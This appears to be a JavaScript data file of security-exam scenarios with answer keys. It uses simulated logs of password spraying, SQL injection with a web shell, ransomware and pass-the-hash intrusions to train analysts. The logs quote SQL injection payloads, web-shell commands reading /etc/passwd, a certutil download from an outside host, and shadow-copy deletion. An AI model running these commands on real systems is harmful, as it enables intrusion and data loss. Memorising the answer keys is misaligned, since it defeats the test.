// System-analysis scenarios (PBQ style): several computers, each with the logs and command output an analyst
// would look at. Tasks are answered with drop-downs (items: [label, correct choice, own choice list]).
//   p: [{ name, role, s: [[caption, text], ...] }]   d = domain, o = objective, lv = difficulty (1-10)
const spray = (users, ip) =>
  users
    .map((u, i) => {
      const t = new Date(Date.UTC(2026, 2, 14, 2, 11, 7 + i * 11)).toISOString().slice(11, 19)
      return `2026-03-14 ${t} AUTH_FAIL user=${u.padEnd(8)} src=${ip} reason=bad_password`
    })
    .join('\n')

export default [
  // ───────────── 1. password spraying through the VPN ─────────────
  {
    d: 2, t: 'match', o: '2.4', lv: 6.2,
    x: 'Network: Internet -> VPN-GW01 (203.0.113.10) -> internal LAN 10.0.0.0/16 (DC01, WEB01)',
    p: [
      {
        name: 'VPN-GW01', role: 'VPN gateway · 203.0.113.10',
        s: [
          ['vpn-auth.log (excerpt)', `${spray(['amartin', 'bwong', 'cdavis', 'dkim', 'ewhite', 'fgarcia', 'hlopez', 'jsmith', 'kpatel', 'lnguyen'], '198.51.100.77')}
2026-03-14 02:13:09 AUTH_OK   user=dkim     src=198.51.100.77 session=VPN-5521 pool=10.8.0.14
2026-03-14 02:13:41 SESSION   user=dkim     bytes_out=48211 bytes_in=2790114`],
          ['Lockout policy', 'Threshold: 5 failed attempts per account\nObservation window: 30 minutes\nSource-IP rate limiting: not configured']
        ]
      },
      {
        name: 'DC01', role: 'Domain controller · 10.0.0.5',
        s: [
          ['Security log (summary)', `ID    Time      Account    Source       Detail
4625  02:11:07  amartin    10.0.0.10    Logon failure 0xC000006A (wrong password)
4625  02:11:18  bwong      10.0.0.10    Logon failure 0xC000006A (wrong password)
4625  02:11:29  cdavis     10.0.0.10    Logon failure 0xC000006A (wrong password)
4625  02:11:40  dkim       10.0.0.10    Logon failure 0xC000006A (wrong password)
4625  02:11:51  ewhite     10.0.0.10    Logon failure 0xC000006A (wrong password)
...   (one failure each for fgarcia, hlopez, jsmith, kpatel, lnguyen)
4624  02:13:09  dkim       10.0.0.10    Logon type 3, success
4740  --        --         --           No account lockouts recorded in this period`]
        ]
      },
      {
        name: 'WEB01', role: 'Public web server · 10.0.20.5',
        s: [
          ['access.log (excerpt)', `203.0.113.88 - - [14/Mar/2026:02:11:10 +0000] "GET /index.html HTTP/1.1" 200 5120
198.51.100.12 - - [14/Mar/2026:02:11:42 +0000] "GET /products?id=4 HTTP/1.1" 200 8911
192.0.2.44 - - [14/Mar/2026:02:12:03 +0000] "GET /contact HTTP/1.1" 200 3204
203.0.113.31 - - [14/Mar/2026:02:12:19 +0000] "POST /cart HTTP/1.1" 302 0`]
        ]
      }
    ],
    q: 'Review the VPN gateway, the domain controller and the web server. Complete each analysis task.',
    choices: ['Password spraying', 'Brute force against one account', 'Credential stuffing', 'Denial of service'],
    items: [
      ['Attack in progress', 'Password spraying'],
      ['Account that must be treated as compromised', 'dkim', ['amartin', 'dkim', 'jsmith', 'none: every attempt failed']],
      ['Why no account was locked out', 'Each account saw only one attempt, below the threshold', ['The attacker disabled the lockout policy', 'Each account saw only one attempt, below the threshold', 'Lockout does not apply to VPN logons', 'The domain controller ignores failures from the gateway']],
      ['WEB01 status', 'Not involved', ['Compromised', 'Under attack', 'Not involved']],
      ['Best control against this attack', 'Enforce MFA and rate-limit or block the source IP', ['Lower the lockout threshold to 3', 'Enforce MFA and rate-limit or block the source IP', 'Increase log retention', 'Require longer passwords only']]
    ],
    e: 'One source (198.51.100.77) tried a single guess against many different accounts about eleven seconds apart, and the domain controller saw one failure per account: password spraying. Because no account reached the 5-attempt threshold, nothing locked out, and the spray succeeded against dkim (AUTH_OK, a session, and 2.7 MB transferred in), so that account is compromised. WEB01 only shows ordinary customer traffic. Lockout policies are tuned for attacks on one account; the controls that defeat a spray are MFA (a guessed password is no longer enough) and source-IP rate limiting or blocking. Lowering the threshold would not help, because each account is tried only once.',
    w: ['Analyze the three systems. Identify the attack, the affected account, and the best mitigation.', 'You are the on-call analyst. Use the evidence from each system to answer the tasks.']
  },

  // ───────────── 2. SQL injection -> web shell -> exfiltration ─────────────
  {
    d: 2, t: 'match', o: '2.3', lv: 7.4,
    x: 'Network: Internet -> EDGE-FW -> DMZ (WEB01 10.0.20.5) -> internal (DB01 10.0.30.8, MAIL01 10.0.40.2)',
    p: [
      {
        name: 'WEB01', role: 'Public web server · 10.0.20.5',
        s: [
          ['nginx access.log (excerpt)', `185.220.101.4 - - [14/Mar/2026:03:02:11 +0000] "GET /shop/item?id=12 HTTP/1.1" 200 6410 "-" "sqlmap/1.7.2#stable"
185.220.101.4 - - [14/Mar/2026:03:02:12 +0000] "GET /shop/item?id=12'%20OR%20'1'='1 HTTP/1.1" 200 48211 "-" "sqlmap/1.7.2#stable"
185.220.101.4 - - [14/Mar/2026:03:02:19 +0000] "GET /shop/item?id=12%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 9120 "-" "sqlmap/1.7.2#stable"
185.220.101.4 - - [14/Mar/2026:03:19:40 +0000] "POST /uploads/avatar.php HTTP/1.1" 200 31 "-" "Mozilla/5.0"
185.220.101.4 - - [14/Mar/2026:03:19:52 +0000] "GET /uploads/avatar.php?c=whoami HTTP/1.1" 200 18 "-" "Mozilla/5.0"
185.220.101.4 - - [14/Mar/2026:03:20:07 +0000] "GET /uploads/avatar.php?c=cat%20/etc/passwd HTTP/1.1" 200 1840 "-" "Mozilla/5.0"`],
          ['File listing: /var/www/html/uploads (modified in last 24h)', `-rw-r--r-- 1 www-data www-data   412 Mar 14 03:19 avatar.php
-rw-r--r-- 1 www-data www-data 88120 Mar 13 15:44 logo-sale.png`]
        ]
      },
      {
        name: 'DB01', role: 'Database server · 10.0.30.8',
        s: [
          ['MySQL general log (excerpt)', `2026-03-14T03:02:12 webapp@10.0.20.5  Query  SELECT * FROM products WHERE id='12' OR '1'='1'
2026-03-14T03:02:19 webapp@10.0.20.5  Query  SELECT * FROM products WHERE id=12 UNION SELECT username,password FROM users--
2026-03-14T03:31:05 webapp@10.0.20.5  Query  SELECT * FROM customers
2026-03-14T03:31:44 webapp@10.0.20.5  Query  SELECT * FROM orders
2026-03-14T03:33:10 webapp@10.0.20.5  Query  SELECT * FROM payment_tokens`],
          ['Connection summary (last hour)', 'Sources: 10.0.20.5 (webapp) only\nRows returned to 10.0.20.5: 1,904,221\nTypical hourly average: 3,200']
        ]
      },
      {
        name: 'EDGE-FW', role: 'Perimeter firewall',
        s: [
          ['Flow log (top talkers, 03:00–04:00)', `src=10.0.20.5   dst=185.220.101.4  proto=tcp dport=443  bytes_out=2,418,330,112  duration=00:27:19
src=10.0.40.2   dst=198.51.100.9   proto=tcp dport=587  bytes_out=2,114,822      duration=00:58:01
src=198.51.100.60 dst=10.0.20.5    proto=tcp dport=443  bytes_out=7,402,115      duration=00:51:30`]
        ]
      },
      {
        name: 'MAIL01', role: 'Internal mail server · 10.0.40.2',
        s: [
          ['Queue summary', 'Messages sent 03:00–04:00: 41 (average 38)\nOutbound relays: smtp.provider.example only\nNo authentication failures']
        ]
      }
    ],
    q: 'A customer-data breach is suspected. Review each system and complete the investigation tasks.',
    choices: ['Initial foothold', 'Data source being stolen from', 'Exfiltration path', 'Not involved'],
    items: [
      ['WEB01', 'Initial foothold'],
      ['DB01', 'Data source being stolen from'],
      ['EDGE-FW', 'Exfiltration path'],
      ['MAIL01', 'Not involved'],
      ['Technique used for initial access', 'SQL injection', ['SQL injection', 'Cross-site scripting', 'Directory traversal', 'Cross-site request forgery']],
      ['File uploaded by the attacker', 'Web shell', ['Web shell', 'Ransomware', 'Rootkit', 'Keylogger']],
      ['Best FIRST containment step', 'Isolate WEB01 from the network and preserve its memory and disk', ['Delete avatar.php and restart nginx', 'Isolate WEB01 from the network and preserve its memory and disk', 'Reset the database administrator password only', 'Block the attacker IP and close the incident']]
    ],
    e: 'WEB01 shows classic SQL injection from sqlmap (a tautology and a UNION SELECT against the id parameter), followed by a request to POST /uploads/avatar.php, a file that did not exist before: a web shell, then used to run whoami and read /etc/passwd. That makes WEB01 the foothold. DB01 returned 1.9 million rows to WEB01 against a normal 3,200 per hour, including customers, orders and payment tokens, so it is the data source. The firewall flow log shows WEB01 sending 2.4 GB to 185.220.101.4 over 443, the exfiltration path. MAIL01 is normal. Contain first: isolate WEB01 and preserve volatile and disk evidence. Deleting the file or restarting destroys evidence and does not remove the attacker, and blocking one IP is not containment.',
    w: ['Investigate the four systems for a suspected breach and complete the tasks.', 'Using the evidence on each system, work out how the attack unfolded.']
  },

  // ───────────── 3. ransomware outbreak ─────────────
  {
    d: 2, t: 'match', o: '2.4', lv: 7.2,
    x: 'Network: user VLAN (WS-FIN-07 10.2.4.17) -> server VLAN (FS01 10.0.50.3, DC01 10.0.0.5) ; BKP01 10.0.60.9 (offline immutable repository)',
    p: [
      {
        name: 'WS-FIN-07', role: 'Finance workstation · 10.2.4.17',
        s: [
          ['Sysmon process creation (excerpt)', `09:14:52  WINWORD.EXE (pid 4120)  ->  cmd.exe /c powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdA...
09:14:53  powershell.exe             ->  certutil.exe -urlcache -f http://203.0.113.200/svc.exe C:\\Users\\public\\svc.exe
09:15:20  svc.exe                    ->  vssadmin.exe delete shadows /all /quiet
09:15:21  svc.exe                    ->  bcdedit.exe /set {default} recoveryenabled no
09:15:30  svc.exe                    ->  enumerates and encrypts C:\\Users\\*  (*.docx, *.xlsx, *.pdf)`],
          ['Desktop', 'README_RESTORE.txt\n"All of your files have been encrypted. To recover them, pay 4 BTC within 72 hours..."\nbudget-2026.xlsx.locked   payroll-q1.xlsx.locked   board-deck.pptx.locked']
        ]
      },
      {
        name: 'FS01', role: 'File server · 10.0.50.3',
        s: [
          ['Security log, file share auditing (Event 5145 / 4663 summary, 09:20–09:26)', `Account: CORP\\tfisher  Source: 10.2.4.17
Files renamed to *.locked in \\\\FS01\\Finance:   14,882
Files created: README_RESTORE.txt (one per folder)
Write operations per minute: 2,100 (baseline: 40)`]
        ]
      },
      {
        name: 'DC01', role: 'Domain controller · 10.0.0.5',
        s: [
          ['Security log (summary, 09:00–10:00)', `4624  Logon success: 212 events (typical for this hour)
4625  Logon failure: 6 events, all different users, no repeating source
4720  Account created: 0     4728  Group membership changes: 0
No unusual processes or services reported by EDR`]
        ]
      },
      {
        name: 'BKP01', role: 'Backup server · 10.0.60.9',
        s: [
          ['Job history', `Last full backup:  2026-03-13 22:00  Success  (verified)
Repository:        offline, immutable (write-once, 30 days)
09:00-10:00:       no connections from user or server VLANs`]
        ]
      }
    ],
    q: 'Files are being encrypted across the finance department. Review each system and complete the tasks.',
    choices: ['Patient zero (initial infection)', 'Impacted: data encrypted over a network share', 'Not affected', 'Clean: usable recovery source'],
    items: [
      ['WS-FIN-07', 'Patient zero (initial infection)'],
      ['FS01', 'Impacted: data encrypted over a network share'],
      ['DC01', 'Not affected'],
      ['BKP01', 'Clean: usable recovery source'],
      ['Likely initial delivery method', 'Email attachment with a malicious macro', ['Email attachment with a malicious macro', 'Infected USB drive', 'Compromised software update', 'Exposed RDP service']],
      ['Which action removes the victim\'s own recovery option?', 'Deleting the volume shadow copies', ['Deleting the volume shadow copies', 'Disabling the firewall', 'Clearing the event log', 'Creating a new local administrator']],
      ['Best immediate containment', 'Disconnect WS-FIN-07 from the network and block its account from FS01', ['Pay the ransom to get a decryption key', 'Disconnect WS-FIN-07 from the network and block its account from FS01', 'Restore FS01 from backup immediately', 'Reimage every workstation tonight']]
    ],
    e: 'The Sysmon chain is the textbook sequence on WS-FIN-07: Word spawns cmd and an encoded PowerShell command, which downloads svc.exe (certutil abused as a downloader), which deletes the shadow copies (vssadmin delete shadows) and disables recovery before encrypting files and leaving a ransom note: ransomware delivered by a malicious Office macro in a phishing attachment. FS01 shows 14,882 files renamed to .locked by the same user from the same workstation, so it was encrypted over the share (the user account is the path, not an FS01 compromise). The domain controller shows normal activity and the backup repository is offline and immutable with a verified backup from last night: a clean recovery source. Contain first: isolate the workstation and cut the account off from the share, then recover from the clean backup once the infection path is closed. Paying does not guarantee recovery, and restoring while infected risks re-encryption.',
    w: ['Ransomware activity has been reported. Examine each system and complete the tasks.', 'Review the evidence from the four systems and determine what happened and what to do first.']
  },

  // ───────────── 4. phishing -> credential theft -> lateral movement ─────────────
  {
    d: 2, t: 'match', o: '2.2', lv: 8.1,
    x: 'Network: MAIL-GW (mail gateway) -> user VLAN (WS-HR-03 10.2.4.33) -> server VLAN (FS02 10.0.50.12, DC01 10.0.0.5)',
    p: [
      {
        name: 'MAIL-GW', role: 'Mail gateway',
        s: [
          ['Message trace (delivered 13 Mar 16:41, 6 recipients)', `From:        "IT Helpdesk" <support@c0mpany-it.com>
Return-Path: <bounce@mailer.example.net>
Subject:     Action required: password expires today
SPF:   fail (203.0.113.77 is not a permitted sender for c0mpany-it.com)
DKIM:  none
DMARC: fail (policy: none)
Link:  http://c0mpany-it.com/reset   (domain registered 2 days ago)
Real company domain: company.com`]
        ]
      },
      {
        name: 'WS-HR-03', role: 'HR workstation · 10.2.4.33',
        s: [
          ['Web proxy log', `13/Mar 16:52:11  hr-user3  GET   http://c0mpany-it.com/reset            200  text/html
13/Mar 16:52:58  hr-user3  POST  http://c0mpany-it.com/reset/login      200  form (username, password)
13/Mar 17:03:20  hr-user3  GET   https://login.company.com/             200`],
          ['EDR alert, 14 Mar 02:09', 'HackTool:Win32/Mimikatz.A detected\nProcess: C:\\ProgramData\\upd.exe   User: SYSTEM\nAction: logged only (policy: audit mode)']
        ]
      },
      {
        name: 'FS02', role: 'HR file server · 10.0.50.12',
        s: [
          ['Security log, 14 Mar', `02:14:08  4624  Logon Type 3 (network)  Account: CORP\\Administrator
          Authentication package: NTLM   Source workstation: WS-HR-03   Source IP: 10.2.4.33
02:14:08  4672  Special privileges assigned to new logon: SeDebugPrivilege, SeBackupPrivilege
02:14:31  7045  A service was installed: PSEXESVC  (C:\\Windows\\PSEXESVC.exe)
02:15:02  5145  Share access: \\\\FS02\\HR$  files read: 3,912`],
          ['Note', 'No interactive or Remote Desktop logon for Administrator on FS02 today.\nAdministrator last changed password: 2025-11-02.']
        ]
      },
      {
        name: 'DC01', role: 'Domain controller · 10.0.0.5',
        s: [
          ['Kerberos / NTLM summary for CORP\\Administrator, 14 Mar', `4768 (Kerberos TGT request): none from WS-HR-03
4776 (NTLM credential validation): 02:14:08 from WS-HR-03 -> success
No password reset events.`]
        ]
      }
    ],
    q: 'HR data may have been accessed. Review the systems and complete the analysis.',
    choices: ['Phishing (spoofed lookalike domain)', 'Spear phishing by phone', 'Typosquatting redirect by DNS poisoning', 'Business email compromise'],
    items: [
      ['How the attacker got the first credentials', 'Phishing (spoofed lookalike domain)'],
      ['Evidence that the email sender is not genuine', 'SPF fail, no DKIM and a DMARC fail for a lookalike domain', ['SPF fail, no DKIM and a DMARC fail for a lookalike domain', 'The message was delivered to six recipients', 'The subject line mentions a password', 'The link uses HTTP instead of HTTPS']],
      ['Credential theft tool on WS-HR-03', 'Mimikatz (dumps credentials from memory)', ['Mimikatz (dumps credentials from memory)', 'A keylogger', 'A RAT beacon', 'Ransomware']],
      ['Technique used to reach FS02', 'Pass-the-hash', ['Pass-the-hash', 'Kerberoasting', 'Password spraying', 'Golden ticket']],
      ['Tool the attacker used to run code on FS02', 'PsExec (PSEXESVC service)', ['PsExec (PSEXESVC service)', 'Remote Desktop', 'SSH', 'Windows Update']],
      ['Most urgent containment', 'Isolate WS-HR-03 and FS02, and reset the Administrator credentials', ['Block c0mpany-it.com and close the ticket', 'Isolate WS-HR-03 and FS02, and reset the Administrator credentials', 'Change only hr-user3\'s password', 'Take FS02 offline for the weekend']]
    ],
    e: 'MAIL-GW shows a lookalike domain (c0mpany-it.com, registered two days ago) sending a password-expiry lure with SPF fail, no DKIM and DMARC fail: a spoofed-sender phishing email. WS-HR-03\'s proxy log shows hr-user3 visited the page and POSTed a username and password. Later EDR flagged Mimikatz running as SYSTEM, which dumps credentials and NTLM hashes from memory, including the local administrator\'s. FS02 then shows CORP\\Administrator logging on over the network (type 3) with NTLM from WS-HR-03 and no interactive logon, while DC01 shows no Kerberos ticket request but only an NTLM validation: the attacker used the hash itself, not the password (pass-the-hash). Service installation 7045 for PSEXESVC identifies PsExec as the execution tool, and 3,912 HR files were read. Contain by isolating both hosts and resetting the exposed credentials; blocking one domain or changing one user\'s password leaves the stolen administrator hash working.',
    w: ['Trace this intrusion across four systems and complete the analysis tasks.', 'HR files were accessed overnight. Review the evidence on each system.']
  }
]
